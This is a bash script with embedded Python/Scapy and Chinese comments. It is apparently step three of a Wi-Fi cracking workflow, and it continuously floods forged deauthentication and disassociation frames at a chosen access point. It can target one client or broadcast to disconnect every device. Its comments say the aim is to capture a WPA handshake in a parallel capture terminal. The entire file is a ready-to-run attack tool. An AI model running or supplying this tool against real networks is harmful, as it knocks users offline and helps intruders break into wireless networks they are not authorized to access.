#!/bin/bash
# ============================================================
# 终端3: Scapy 持续 Deauth 攻击
#
# 重要: MT7921U 网卡 aireplay-ng 注入无效，
#       但 scapy 的 raw socket 注入经 tcpdump 验证有效！
#
# 用法: sudo bash 3_deauth.sh <BSSID> <频道> [客户端MAC]
# 例:   sudo bash 3_deauth.sh A4:BA:70:04:1A:7E 9
# 例:   sudo bash 3_deauth.sh A4:BA:70:04:1A:7E 9 14:D8:81:A0:DC:3D
#
# 作者: 传康Kk (微信:1837620622)
# ============================================================

# ---- 颜色 ----
R='\033[91m'; G='\033[92m'; Y='\033[93m'; C='\033[96m'; E='\033[0m'
info()  { echo -e "  ${C}[*]${E} $1"; }
ok()    { echo -e "  ${G}[✓]${E} $1"; }
warn()  { echo -e "  ${Y}[!]${E} $1"; }
err()   { echo -e "  ${R}[✗]${E} $1"; }

# ---- 检查参数 ----
[ "$(id -u)" -ne 0 ] && { err "需要 root: sudo bash 3_deauth.sh <BSSID> <频道> [客户端MAC]"; exit 1; }

BSSID="$1"
CHANNEL="$2"
CLIENT="$3"

if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
    echo ""
    err "缺少参数！"
    echo ""
    echo "  用法: sudo bash 3_deauth.sh <BSSID> <频道> [客户端MAC]"
    echo "  例:   sudo bash 3_deauth.sh A4:BA:70:04:1A:7E 9"
    echo "  例:   sudo bash 3_deauth.sh A4:BA:70:04:1A:7E 9 14:D8:81:A0:DC:3D"
    echo ""
    echo "  不指定客户端MAC = 广播模式（踢掉所有连接的设备）"
    echo "  指定客户端MAC = 只踢指定设备（更精准）"
    echo ""
    exit 1
fi

# ---- 获取监听接口 ----
MON=$(iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i}')
if [ -z "$MON" ]; then
    # 如果没有监听接口，用原始 wlan0 设置 monitor
    IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
    [ -z "$IFACE" ] && { err "未找到无线网卡"; exit 1; }
    ip link set "$IFACE" down 2>/dev/null
    iw dev "$IFACE" set type monitor 2>/dev/null
    ip link set "$IFACE" up 2>/dev/null
    sleep 1
    MON="$IFACE"
fi

# ---- 锁定频道 ----
iw dev "$MON" set channel "$CHANNEL" 2>/dev/null

echo ""
echo -e "  ${C}╔════════════════════════════════════════════╗${E}"
echo -e "  ${C}║   终端3: Scapy Deauth 持续攻击            ║${E}"
echo -e "  ${C}╚════════════════════════════════════════════╝${E}"
echo ""
info "目标 AP: $BSSID"
info "频道: $CHANNEL"
if [ -n "$CLIENT" ]; then
    info "客户端: $CLIENT（精准模式）"
else
    info "客户端: ff:ff:ff:ff:ff:ff（广播模式）"
fi
info "接口: $MON"
info "方式: Scapy raw socket（已验证有效）"
echo ""
warn "确保终端2的 capture 已经在运行！"
echo ""
echo -e "  ${Y}持续发送 Deauth 直到你按 Ctrl+C 停止${E}"
echo -e "  ${Y}终端2右上角出现 WPA handshake 后就可以停了${E}"
echo ""

# ---- Scapy 持续 Deauth + Disassoc 攻击 ----
python3 << PYEOF
import sys, signal, time
from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp, conf

# 关闭 scapy 的冗余输出
conf.verb = 0

ap = "$BSSID"
client = "${CLIENT:-ff:ff:ff:ff:ff:ff}"
iface = "$MON"

# ---------------------------------------------------------------------------
# 构造 4 种攻击帧（最大化断开概率）
# ---------------------------------------------------------------------------

# Deauth: AP → 客户端（reason=7: Class 3 frame）
deauth_ap2cl = RadioTap() / Dot11(
    type=0, subtype=12,
    addr1=client, addr2=ap, addr3=ap
) / Dot11Deauth(reason=7)

# Deauth: 客户端 → AP（reason=1: Unspecified）
deauth_cl2ap = RadioTap() / Dot11(
    type=0, subtype=12,
    addr1=ap, addr2=client, addr3=ap
) / Dot11Deauth(reason=1)

# Disassoc: AP → 客户端（reason=8: Disassociated because leaving）
disas_ap2cl = RadioTap() / Dot11(
    type=0, subtype=10,
    addr1=client, addr2=ap, addr3=ap
) / Dot11Disas(reason=8)

# Disassoc: 客户端 → AP
disas_cl2ap = RadioTap() / Dot11(
    type=0, subtype=10,
    addr1=ap, addr2=client, addr3=ap
) / Dot11Disas(reason=8)

# 合并所有帧为一个列表，一次性批量发送（速度更快）
if client != "ff:ff:ff:ff:ff:ff":
    # 精准模式：4种帧各 20 个 = 每轮 80 帧
    burst = ([deauth_ap2cl] * 20 + [deauth_cl2ap] * 20 +
             [disas_ap2cl] * 20 + [disas_cl2ap] * 20)
    burst_size = 80
else:
    # 广播模式：只发 AP→广播 方向，每轮 64 帧
    burst = [deauth_ap2cl] * 32 + [disas_ap2cl] * 32
    burst_size = 64

total_sent = 0
round_num = 0
running = True

def stop(sig, frame):
    global running
    running = False
    print("\n  [+] 停止! 共发送 %d 轮, %d 个攻击帧" % (round_num, total_sent))
    sys.exit(0)

signal.signal(signal.SIGINT, stop)

print("  [*] 开始持续 Deauth + Disassoc 攻击...")
print("  [*] AP=%s  客户端=%s" % (ap, client))
print("  [*] 接口=%s  每轮=%d帧  间隔=0.01s" % (iface, burst_size))
print()

while running:
    round_num += 1
    # 批量发送，inter=0.01 极短间隔，最大化攻击速度
    sendp(burst, iface=iface, inter=0.01)
    total_sent += burst_size
    print("  [*] 第 %d 轮 | 已发送 %d 个攻击帧 (deauth+disassoc)" % (round_num, total_sent), end="\r")
    # 短暂暂停让网卡切换回接收，确保终端2能抓到握手
    time.sleep(0.3)
PYEOF
